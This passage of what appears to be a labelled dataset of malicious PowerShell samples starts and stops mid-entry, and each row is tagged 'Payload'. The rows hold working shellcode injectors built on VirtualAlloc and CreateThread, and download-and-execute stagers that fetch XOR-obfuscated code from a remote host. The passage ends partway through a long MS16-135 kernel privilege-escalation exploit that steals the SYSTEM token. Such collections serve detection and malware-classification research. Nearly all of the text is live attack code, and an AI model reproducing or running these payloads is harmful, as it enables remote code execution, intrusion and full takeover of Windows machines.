,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\\syswow64\\WindowsPowerShell\\v1.0\\powershell"";iex ""& $w8jB $EXRG $e""}else{;iex ""& powershell $EXRG $e"";}

",Payload
c41cff289a045bc9bebaac3565b8bef9b90ce54b41226e99fac9761ff51322c4,"
$wC=NEW-OBjeCT SYStEm.NeT.WEBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadErS.ADD('User-Agent',$u);$WC.PROXY = [SYsteM.Net.WebReQuEsT]::DefaULtWEbProxy;$wC.PrOxY.CrEDeNTIALs = [SysTeM.Net.CREdeNTialCACHe]::DEfAuLTNetWORKCREDENTialS;$K='-X3ex5fP{c4>8Yk}*+OES7h:zm%]r~td';$i=0;[CHAR[]]$B=([CHaR[]]($WC.DOwNLOAdSTrING(""http://192.168.1.100:40/index.asp"")))|%{$_-BXoR$K[$I++%$k.LenGth]};IEX ($B-joIN'')

",Payload
d48fd8fd5f3338ee71f037dc645862542a8f3e3f984508ed717940684d28bf44,"
$8D6W = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $8D6W -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x16,0x87,0x78,0x01,0xd9,0xec,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x46,0x0f,0x03,0x46,0x19,0x65,0x8d,0xfd,0xcd,0xeb,0x6e,0xfe,0x0d,0x8c,0xe7,0x1b,0x3c,0x8c,0x9c,0x68,0x6e,0x3c,0xd6,0x3d,0x82,0xb7,0xba,0xd5,0x11,0xb5,0x12,0xd9,0x92,0x70,0x45,0xd4,0x23,0x28,0xb5,0x77,0xa7,0x33,0xea,0x57,0x96,0xfb,0xff,0x96,0xdf,0xe6,0xf2,0xcb,0x88,0x6d,0xa0,0xfb,0xbd,0x38,0x79,0x77,0x8d,0xad,0xf9,0x64,0x45,0xcf,0x28,0x3b,0xde,0x96,0xea,0xbd,0x33,0xa3,0xa2,0xa5,0x50,0x8e,0x7d,0x5d,0xa2,0x64,0x7c,0xb7,0xfb,0x85,0xd3,0xf6,0x34,0x74,0x2d,0x3e,0xf2,0x67,0x58,0x36,0x01,0x15,0x5b,0x8d,0x78,0xc1,0xee,0x16,0xda,0x82,0x49,0xf3,0xdb,0x47,0x0f,0x70,0xd7,0x2c,0x5b,0xde,0xfb,0xb3,0x88,0x54,0x07,0x3f,0x2f,0xbb,0x8e,0x7b,0x14,0x1f,0xcb,0xd8,0x35,0x06,0xb1,0x8f,0x4a,0x58,0x1a,0x6f,0xef,0x12,0xb6,0x64,0x82,0x78,0xde,0x49,0xaf,0x82,0x1e,0xc6,0xb8,0xf1,0x2c,0x49,0x13,0x9e,0x1c,0x02,0xbd,0x59,0x63,0x39,0x79,0xf5,0x9a,0xc2,0x7a,0xdf,0x58,0x96,0x2a,0x77,0x49,0x97,0xa0,0x87,0x76,0x42,0x5c,0x8d,0xe0,0xad,0x09,0x8c,0xde,0x45,0x48,0x8f,0x0f,0xca,0xc5,0x69,0x7f,0xa2,0x85,0x25,0x3f,0x12,0x66,0x96,0xd7,0x78,0x69,0xc9,0xc7,0x82,0xa3,0x62,0x6d,0x6d,0x1a,0xda,0x19,0x14,0x07,0x90,0xb8,0xd9,0x9d,0xdc,0xfa,0x52,0x12,0x20,0xb4,0x92,0x5f,0x32,0x20,0x53,0x2a,0x68,0xe6,0x6c,0x80,0x07,0x06,0xf9,0x2f,0x8e,0x51,0x95,0x2d,0xf7,0x95,0x3a,0xcd,0xd2,0xae,0xf3,0x5b,0x9d,0xd8,0xfb,0x8b,0x1d,0x18,0xaa,0xc1,0x1d,0x70,0x0a,0xb2,0x4d,0x65,0x55,0x6f,0xe2,0x36,0xc0,0x90,0x53,0xeb,0x43,0xf9,0x59,0xd2,0xa4,0xa6,0xa2,0x31,0x35,0x9a,0x74,0x7f,0x43,0xf2,0x44;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$WVf=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($WVf.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$WVf,0,0,0);for (;;){Start-sleep 60};

",Payload
20fe9c54ba35adea50e010ce9f5dcb0938166c07b5d3b6df724e9b336f6149b3,"
$wc=NeW-OBJecT SystEm.NET.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wc.HEadErs.Add('User-Agent',$u);$Wc.PrOxY = [SySTeM.NET.WeBReQUesT]::DefaUlTWEbPROxY;$WC.PROxY.CredeNtiaLs = [SysteM.Net.CReDEnTIALCache]::DeFaULtNEtWOrKCredeNtIals;$K='M\\~e5v(]Fb

",Payload
1c6d32f94bc624c9d33a9eb2a4d9a52f1e5e799f39d76722c34ce22f8a681f93,"function Invoke-MS16135 {

    [CmdletBinding()]
    param(

        [Parameter(Position=0,Mandatory=$True)]
        [String]
        $Command
    )

	Add-Type -TypeDefinition @""
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct SQOS
	{
		public int Length;
		public int ImpersonationLevel;
		public int ContextTrackingMode;
		public bool EffectiveOnly;
	}

	public static class Advapi32
	{
		[DllImport(""advapi32.dll"", SetLastError=true, CharSet=CharSet.Unicode)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
			
		[DllImport(""advapi32.dll"", SetLastError=true)]
		public static extern bool SetThreadToken(
			ref IntPtr Thread,
			IntPtr Token);
			
		[DllImport(""advapi32.dll"", SetLastError=true)]
		public static extern bool OpenThreadToken(
			IntPtr ThreadHandle,
			int DesiredAccess,
			bool OpenAsSelf,
			out IntPtr TokenHandle);
			
		[DllImport(""advapi32.dll"", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport(""advapi32.dll"", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
	}

	public static class Kernel32
	{
		[DllImport(""kernel32.dll"")]
		public static extern uint GetLastError();

		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern IntPtr GetCurrentProcess();

		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
		
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern int GetThreadId(IntPtr hThread);
		
		[DllImport(""kernel32.dll"", SetLastError = true)]
		public static extern int GetProcessIdOfThread(IntPtr handle);
		
		[DllImport(""kernel32.dll"",SetLastError=true)]
		public static extern int SuspendThread(IntPtr hThread);
		
		[DllImport(""kernel32.dll"",SetLastError=true)]
		public static extern int ResumeThread(IntPtr hThread);
		
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);

		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		
		[DllImport(""kernel32.dll"", SetLastError=true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			int dwDesiredAccess,
			bool bInheritHandle,
			int dwOptions);
	}


	[StructLayout(LayoutKind.Sequential)]
	public struct INPUT
	{
		public int itype;
		public KEYBDINPUT U;
		public int Size;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct KEYBDINPUT
	{
		public UInt16 wVk;
		public UInt16 wScan;
		public uint dwFlags;
		public int time;
		public IntPtr dwExtraInfo;
	}

	[StructLayout(LayoutKind.Sequential)] 
	public struct tagMSG  
	{  
		public IntPtr hwnd;
		public UInt32 message;
		public UIntPtr wParam;
		public UIntPtr lParam;
		public UInt32 time;
		public POINT pt;
	}

	public struct POINT
	{  
		public Int32 x;
		public Int32 Y;
	}

	public class ms16135
	{
		delegate IntPtr WndProc(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);

		[System.Runtime.InteropServices.StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
		struct WNDCLASSEX
		{
			public uint cbSize;
			public uint style;
			public IntPtr lpfnWndProc;
			public int cbClsExtra;
			public int cbWndExtra;
			public IntPtr hInstance;
			public IntPtr hIcon;
			public IntPtr hCursor;
			public IntPtr hbrBackground;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszMenuName;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszClassName;
			public IntPtr hIconSm;
		}
		
		[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
		static extern System.UInt16 RegisterClassW(
			[System.Runtime.InteropServices.In] ref WNDCLASSEX lpWndClass);

		[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
		public static extern IntPtr CreateWindowExW(
			UInt32 dwExStyle,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpClassName,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpWindowName,
			UInt32 dwStyle,
			Int32 x,
			Int32 y,
			Int32 nWidth,
			Int32 nHeight,
			IntPtr hWndParent,
			IntPtr hMenu,
			IntPtr hInstance,
			IntPtr lpParam);

		[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
		static extern System.IntPtr DefWindowProcW(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);

		[System.Runtime.InteropServices.DllImport(""user32.dll"", SetLastError = true)]
		public static extern bool DestroyWindow(
			IntPtr hWnd);

		[DllImport(""user32.dll"", SetLastError = true)]
		public static extern bool UnregisterClass(
			String lpClassName,
			IntPtr hInstance);

		[System.Runtime.InteropServices.DllImport(""kernel32.dll"", SetLastError = true)]
		public static extern IntPtr GetModuleHandleW(
			[MarshalAs(UnmanagedType.LPWStr)]
			String lpModuleName);

		[DllImport(""user32.dll"", EntryPoint=""SetWindowLongPtr"")]
		public static extern IntPtr SetWindowLongPtr(
			IntPtr hWnd,
			int nIndex,
			IntPtr dwNewLong);

		[DllImport(""user32.dll"")]
		public static extern bool ShowWindow(
			IntPtr hWnd,
			int nCmdShow);

		[DllImport(""user32.dll"", SetLastError = true)]
		public static extern IntPtr SetParent(
			IntPtr hWndChild,
			IntPtr hWndNewParent);

		[DllImport(""user32.dll"", SetLastError = false)]
		public static extern IntPtr GetDesktopWindow();

		[DllImport(""user32.dll"")]
		public static extern bool SetForegroundWindow(
			IntPtr hWnd);

		[DllImport(""user32.dll"", SetLastError=true)]
		public static extern void SwitchToThisWindow(
			IntPtr hWnd,
			bool fAltTab);

		[DllImport(""user32.dll"")]
		public static extern bool GetMessage(
			out tagMSG lpMsg,
			IntPtr hWnd,
			uint wMsgFilterMin,
			uint wMsgFilterMax);

		[DllImport(""user32.dll"")]
		public static extern bool TranslateMessage(
			[In] ref tagMSG lpMsg);

		[DllImport(""user32.dll"")]
		public static extern IntPtr DispatchMessage(
			[In] ref tagMSG lpmsg);

		[DllImport(""user32.dll"", SetLastError = true)]
		public static extern IntPtr SetFocus(
			IntPtr hWnd);

		[DllImport(""user32.dll"")]
		public static extern uint SendInput(
			uint nInputs, 
			[In] INPUT pInputs, 
			int cbSize);

		[DllImport(""gdi32.dll"")]
		public static extern int GetBitmapBits(
			IntPtr hbmp,
			int cbBuffer,
			IntPtr lpvBits);

		[DllImport(""gdi32.dll"")]
		public static extern int SetBitmapBits(
			IntPtr hbmp,
			int cbBytes,
			IntPtr lpBits);

		[DllImport(""kernel32.dll"", SetLastError = true)]
		public static extern IntPtr VirtualAlloc(
			IntPtr lpAddress,
			uint dwSize,
			UInt32 flAllocationType,
			UInt32 flProtect);

		public UInt16 CustomClass(string class_name)
		{
			m_wnd_proc_delegate = CustomWndProc;
			WNDCLASSEX wind_class = new WNDCLASSEX();
			wind_class.lpszClassName = class_name;
			///wind_class.cbSize = (uint)Marshal.SizeOf(wind_class);
			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
			return RegisterClassW(ref wind_class);
		}

		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			return DefWindowProcW(hWnd, msg, wParam, lParam);
		}

		private WndProc m_wnd_proc_delegate;
	}
""@


	$ms16135 = @""
	 _____ _____ ___   ___     ___   ___ ___ 
	|     |   __|_  | |  _|___|_  | |_  |  _|
	| | | |__   |_| |_| . |___|_| |_|_  |_  |
	|_|_|_|_____|_____|___|   |_____|___|___|
										
	                   [by b33f -> @FuzzySec]
					   
""@
	$ms16135

	if ([System.IntPtr]::Size -ne 8) {
		""`n[!] Target architecture is x64 only!`n""
		Return
	}

	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$Script:OSMajorMinor = ""$($OSVersion.Major).$($OSVersion.Minor)""
	switch ($OSMajorMinor)
	{
		'10.0' 
		{
			Write-Verbose ""[?] Target is Win 10""
			Write-Verbose ""[+] Bitmap dimensions: 0x760*0x4`n""
		}

		'6.3' 
		{
			Write-Verbose ""[?] Target is Win 8.1""
			Write-Verbose ""[+] Bitmap dimensions: 0x760*0x4`n""
		}

		'6.2' 
		{
			Write-Verbose ""[?] Target is Win 8""
			Write-Verbose ""[+] Bitmap dimensions: 0x760*0x4`n""
		}

		'6.1' 
		{
			Write-Verbose ""[?] Target is Win 7""
			Write-Verbose ""[+] Bitmap dimensions: 0x770*0x4`n""
		}
	}

	function Get-LoadedModules {

		Add-Type -TypeDefinition @""
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		public struct SYSTEM_MODULE_INFORMATION
		{
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
			public UIntPtr[] Reserved;
			public IntPtr ImageBase;
			public UInt32 ImageSize;
			public UInt32 Flags;
			public UInt16 LoadOrderIndex;
			public UInt16 InitOrderIndex;
			public UInt16 LoadCount;
			public UInt16 ModuleNameOffset;
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			internal Char[] _ImageName;
			public String ImageName {
				get {
					return new String(_ImageName).Split(new Char[] {'\\0'}, 2)[0];
				}
			}
		}

		public static class Ntdll
		{
			[DllImport(""ntdll.dll"")]
			public static extern int NtQuerySystemInformation(
				int SystemInformationClass,
				IntPtr SystemInformation,
				int SystemInformationLength,
				ref int ReturnLength);
		}
""@

		[int]$BuffPtr_Size = 0
		while ($true) {
			[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
			$SystemInformationLength = New-Object Int
		
			$CallResult = [Ntdll]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)
			
			if ($CallResult -eq 0xC0000004) {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
			}
			elseif ($CallResult -eq 0x00000000) {
				break
			}
			else {
				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
				return
			}
		}

		$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
		$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
		if ([System.IntPtr]::Size -eq 4) {
			$SYSTEM_MODULE_INFORMATION_Size = 284
		} else {
			$SYSTEM_MODULE_INFORMATION_Size = 296
		}

		$BuffOffset = $BuffPtr.ToInt64()
		$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
		$BuffOffset = $BuffOffset + [System.IntPtr]::Size

		$SystemModuleArray = @()
		for ($i=0; $i -lt $HandleCount; $i++){
			$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
			$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
			
			$HashTable = @{
				ImageName = $Cast.ImageName
				ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
				ImageSize = ""0x$('{0:X}' -f $Cast.ImageSize)""
			}
			
			$Object = New-Object PSObject -Property $HashTable
			$SystemModuleArray += $Object
		
			$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
		}

		$SystemModuleArray

		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
	}

	function Stage-gSharedInfoBitmap {

		Add-Type -TypeDefinition @""
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;

		public static class gSharedInfoBitmap
		{
			[DllImport(""gdi32.dll"")]
			public static extern IntPtr CreateBitmap(
				int nWidth,
				int nHeight,
				uint cPlanes,
				uint cBitsPerPel,
				IntPtr lpvBits);

			[DllImport(""kernel32"", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			
			[DllImport(""kernel32"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);

			[DllImport(""user32.dll"")]
			public static extern IntPtr CreateAcceleratorTable(
				IntPtr lpaccl,
				int cEntries);

			[DllImport(""user32.dll"")]
			public static extern bool DestroyAcceleratorTable(
				IntPtr hAccel);
		}
""@

		if ([System.IntPtr]::Size -eq 4) {
			$x32 = 1
		}

		function Create-AcceleratorTable {
			[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(10000)
			$AccelHandle = [gSharedInfoBitmap]::CreateAcceleratorTable($Buffer, 700) 
			$User32Hanle = [gSharedInfoBitmap]::LoadLibrary(""user32.dll"")
			$gSharedInfo = [gSharedInfoBitmap]::GetProcAddress($User32Hanle, ""gSharedInfo"")
			if ($x32){
				$gSharedInfo = $gSharedInfo.ToInt32()
			} else {
				$gSharedInfo = $gSharedInfo.ToInt64()
			}
			$aheList = $gSharedInfo + [System.IntPtr]::Size
			if ($x32){
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt32($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0xc 
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt32($HandleEntry)
			} else {
				$aheList = [System.Runtime.InteropServices.Marshal]::ReadInt64($aheList)
				$HandleEntry = $aheList + ([int]$AccelHandle -band 0xffff)*0x18 
				$phead = [System.Runtime.InteropServices.Marshal]::ReadInt64($HandleEntry)
			}

			$Result = @()
			$HashTable = @{
				Handle = $AccelHandle
				KernelObj = $phead
			}
			$Object = New-Object PSObject -Property $HashTable
			$Result += $Object
			$Result
		}

		function Destroy-AcceleratorTable {
			param ($Hanlde)
			$CallResult = [gSharedInfoBitmap]::DestroyAcceleratorTable($Hanlde)
		}

		$KernelArray = @()
		for ($i=0;$i -lt 20;$i++) {
			$KernelArray += Create-AcceleratorTable
			if ($KernelArray.Length -gt 1) {
				if ($KernelArray[$i].KernelObj -eq $KernelArray[$i-1].KernelObj) {
					Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
					[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x50*2*4)
					if ($OSMajorMinor -eq ""6.1"") { 
						$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x770, 4, 1, 8, $Buffer) 
					} else {
						$BitmapHandle = [gSharedInfoBitmap]::CreateBitmap(0x760, 4, 1, 8, $Buffer) 
					}
					break
				}
			}
			Destroy-AcceleratorTable -Hanlde $KernelArray[$i].Handle
		}

		$BitMapObject = @()
		$HashTable = @{
			BitmapHandle = $BitmapHandle
			BitmapKernelObj = $($KernelArray[$i].KernelObj)
			BitmappvScan0 = if ($x32) {$($KernelArray[$i].KernelObj) + 0x32} else {$($KernelArray[$i].KernelObj) + 0x50}
		}
		$Object = New-Object PSObject -Property $HashTable
		$BitMapObject += $Object
		$BitMapObject
	}

	function Bitmap-Elevate {
		param([IntPtr]$ManagerBitmap,[IntPtr]$WorkerBitmap)

		Add-Type -TypeDefinition @""
		using System;
		using System.Diagnostics;
		using System.Runtime.InteropServices;
		using System.Security.Principal;
		public static class BitmapElevate
		{
			[DllImport(""gdi32.dll"")]
			public static extern int SetBitmapBits(
				IntPtr hbmp,
				uint cBytes,
				byte[] lpBits);
			[DllImport(""gdi32.dll"")]
			public static extern int GetBitmapBits(
				IntPtr hbmp,
				int cbBuffer,
				IntPtr lpvBits);
			[DllImport(""kernel32.dll"", SetLastError = true)]
			public static extern IntPtr VirtualAlloc(
				IntPtr lpAddress,
				uint dwSize,
				UInt32 flAllocationType,
				UInt32 flProtect);
			[DllImport(""kernel32.dll"", SetLastError=true)]
			public static extern bool VirtualFree(
				IntPtr lpAddress,
				uint dwSize,
				uint dwFreeType);
			[DllImport(""kernel32.dll"", SetLastError=true)]
			public static extern bool FreeLibrary(
				IntPtr hModule);
			[DllImport(""kernel32"", SetLastError=true, CharSet = CharSet.Ansi)]
			public static extern IntPtr LoadLibrary(
				string lpFileName);
			[DllImport(""kernel32"", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
			public static extern IntPtr GetProcAddress(
				IntPtr hModule,
				string procName);
		}
""@

		function Bitmap-Read {
			param ($Address)
			$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
			[IntPtr]$Pointer = [BitmapElevate]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
			$CallResult = [BitmapElevate]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
			if ($x32Architecture){
				[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
			} else {
				[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
			}
			$CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
		}
		
		function Bitmap-Write {
			param ($Address, $Value)
			$CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
			$CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
		}

		switch ($OSMajorMinor)
		{
			'10.0' 
			{
				$UniqueProcessIdOffset = 0x2e8
				$TokenOffset = 0x358          
				$ActiveProcessLinks = 0x2f0
			}
		
			'6.3' 
			{
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			}
		
			'6.2' 
			{
				$UniqueProcessIdOffset = 0x2e0
				$TokenOffset = 0x348          
				$ActiveProcessLinks = 0x2e8
			}
		
			'6.1' 
			{
				$UniqueProcessIdOffset = 0x180
				$TokenOffset = 0x208          
				$ActiveProcessLinks = 0x188
			}
		}
		
		Write-Verbose ""`n[>] Leaking SYSTEM _EPROCESS..""
		$SystemModuleArray = Get-LoadedModules
		$KernelBase = $SystemModuleArray[0].ImageBase
		$KernelType = ($SystemModuleArray[0].ImageName -split ""\\\\"")[-1]
		$KernelHanle = [BitmapElevate]::LoadLibrary(""$KernelType"")
		$PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, ""PsInitialSystemProcess"")
		$SysEprocessPtr = if (!$x32Architecture) {$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase} else {$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase}
		$CallResult = [BitmapElevate]::FreeLibrary($KernelHanle)
		Write-Verbose ""[+] _EPROCESS list entry: 0x$(""{0:X}"" -f $SysEprocessPtr)""
		$SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
		Write-Verbose ""[+] SYSTEM _EPROCESS address: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $SysEprocessPtr))""
		Write-Verbose ""[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))""
		Write-Verbose ""[+] SYSTEM Token: 0x$(""{0:X}"" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))""
		$SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
		
		Write-Verbose ""`n[>] Spawn child""
		
		$npipeName = Get-Random

		Write-Verbose ""`n[>] Choosen name : $npipeName""
		
		$StartupInfo = New-Object STARTUPINFO
		$StartupInfo.dwFlags = 0x00000001
		$StartupInfo.wShowWindow = 0x00000000
		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) 
		$ProcessInfo = New-Object PROCESS_INFORMATION
		$GetCurrentPath = (Get-Item -Path "".\\"" -Verbose).FullName
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
		""user"", ""domain"", ""pass"",
		0x00000002, ""$Env:SystemRoot\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", "" add-type -assemblyName `'System.Core`';`$npipeClient = new-object System.IO.Pipes.NamedPipeClientStream(`'.`', `'$npipeName`', [System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None,[System.Security.Principal.TokenImpersonationLevel]::Impersonation);`$pipeReader = `$pipeWriter = `$null;`$playerName = `'ping`';`$npipeClient.Connect();`$pipeWriter = new-object System.IO.StreamWriter(`$npipeClient);`$pipeReader = new-object System.IO.StreamReader(`$npipeClient);`$pipeWriter.AutoFlush = `$true;`$pipeWriter.WriteLine(`$playerName);IEX `$pipeReader.ReadLine();`$npipeClient.Dispose();"",
		$null, $null, $GetCurrentPath,
		[ref]$StartupInfo, [ref]$ProcessInfo)


		add-type -assemblyName ""System.Core""
		$npipeServer = new-object System.IO.Pipes.NamedPipeServerStream($npipeName, [System.IO.Pipes.PipeDirection]::InOut)
		$npipeServer.WaitForConnection()
		$pipeReader = new-object System.IO.StreamReader($npipeServer)
		$script:pipeWriter = new-object System.IO.StreamWriter($npipeServer)
		$pipeWriter.AutoFlush = $true
		$playerName = $pipeReader.ReadLine()
		
		if($playerName -eq ""ping"")
		{
			Write-Verbose ""[+] Ping from child, voila""
		}
		
		Write-Verbose ""[+] Child PID is : $(""{0}"" -f $ProcessInfo.dwProcessId)`n""
		
		Write-Verbose ""`n[>] Leaking current _EPROCESS..""
		Write-Verbose ""[+] Traversing ActiveProcessLinks list""
		$NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
		while($true) {
			$NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
			if ($NextPID -eq $ProcessInfo.dwProcessId) {
